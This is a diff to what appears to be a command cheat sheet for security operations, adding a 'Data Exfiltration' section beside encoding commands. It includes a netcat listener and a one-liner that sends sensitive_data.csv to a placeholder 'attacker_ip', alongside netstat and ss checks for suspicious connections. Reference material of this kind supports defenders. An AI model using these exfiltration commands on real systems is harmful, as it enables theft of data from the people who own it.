@@ -6,6 +6,14 @@ A searchable command reference for cybersecurity operations, threat hunting, inc
 
 # Command Index
 
+## Data Exfiltration
+
+netcat listener (receive file) | nc -lvnp 10000 > sensitive_data.csv
+netcat send file to remote host | nc attacker_ip 10000 -n -q1 < sensitive_data.csv
+list open ports (check unusual outbound) | netstat -tulnp
+list listening sockets (modern alternative) | ss -tuln
+show active connections with process info | ss -tp  
+
 ## Encoding / Decoding
 
 base64 decode | echo <base64> | base64 -d  
